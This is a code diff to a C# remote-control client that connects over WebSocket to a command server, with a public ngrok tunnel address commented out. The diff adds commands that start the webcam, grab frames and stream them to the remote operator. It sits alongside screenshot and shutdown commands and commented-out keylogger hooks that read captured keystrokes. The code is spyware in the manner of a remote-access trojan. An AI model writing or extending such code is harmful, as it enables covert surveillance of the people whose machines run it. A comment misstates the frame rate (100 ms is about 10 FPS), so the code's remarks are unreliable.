@@ -4,6 +4,7 @@
 //using System.Drawing.Imaging;
 //using System.IO;
 //using KeyLogger;
+//using Microsoft.VisualBasic.Logging;
 using System.Diagnostics;
 using System.Drawing.Imaging;
 
@@ -20,6 +21,11 @@ using System.Text.Json;
 class Program
 {
     static ClientWebSocket ws = new ClientWebSocket();
+
+    static Webcam webcam = new Webcam();
+    static bool webcamRunning = false;
+
+
     //static KeylogController kl = new KeylogController();
 
     static async Task Main(string[] args)
@@ -27,6 +33,8 @@ class Program
         Console.WriteLine("Starting client...");
 
         await ws.ConnectAsync(new Uri("ws://localhost:5000/ws"), CancellationToken.None);
+        //await ws.ConnectAsync(new Uri("wss://abigail-conciliable-hyun.ngrok-free.dev/ws/"), CancellationToken.None);
+    
 
         // REGISTER
         await Send(new
@@ -81,9 +89,25 @@ class Program
         //// ================= NORMAL COMMAND =================
         switch (command)
         {
-            case "KEYLOG":
-                //keylog();
-                break;
+            //case "KEYLOG":
+            //    kl.Start();
+            //    break;
+
+            //case "HOOK":
+            //    kl.Hook();
+            //    break;
+
+            //case "UNHOOK":
+            //    kl.Unhook();
+            //    break;
+
+            //case "PRINT":
+            //    sendText(from, command.ToLower(), kl.PrintKeys());
+            //    break;
+
+            //case "EXIT":
+            //    kl.Stop();
+            //    break;
 
             case "SCREENSHOT-TAKE":
                 sendImage(from, take());
@@ -123,6 +147,25 @@ class Program
 
             case "SHUTDOWN":
                 shutdown();
+                break;
+
+            case "WEBCAM-START":
+                webcam.Start();
+                webcamRunning = true;
+                break;
+
+            case "WEBCAM-GET":
+                if (webcamRunning)
+                    sendImage(from, webcam.GetFrame());
+                break;
+
+            case "WEBCAM-STREAM":
+                _ = StreamWebcam(from);
+                break;
+
+            case "WEBCAM-STOP":
+                webcam.Stop();
+                webcamRunning = false;
                 break;
 
             default:
@@ -366,6 +409,45 @@ class Program
             }
         }
     }
+
+    static async Task StreamWebcam(string to)
+    {
+        while (webcamRunning)
+        {
+            var frame = webcam.GetFrame();
+
+            if (frame != null)
+            {
+                sendImage(to, frame);
+            }
+
+            await Task.Delay(100); // ~50 FPS
+        }
+    }
+
+    //static void hook(ref Thread tklog)
+    //{
+    //    String s = "";
+    //    tklog.Start();
+    //    //File.WriteAllText(appstart.path, "");
+    //}
+
+    //static void unhook(ref Thread tklog)
+    //{
+    //    tklog.Suspend();
+    //}
+
+    //static string printKey()
+    //{
+    //    String s = "";
+    //    s = File.ReadAllText(appstart.path);
+    //    //File.WriteAllText(appstart.path, "");
+
+    //    if (s == "")
+    //        s = "\0";
+
+    //    return s;
+    //}
 
     static void shutdown()
     {
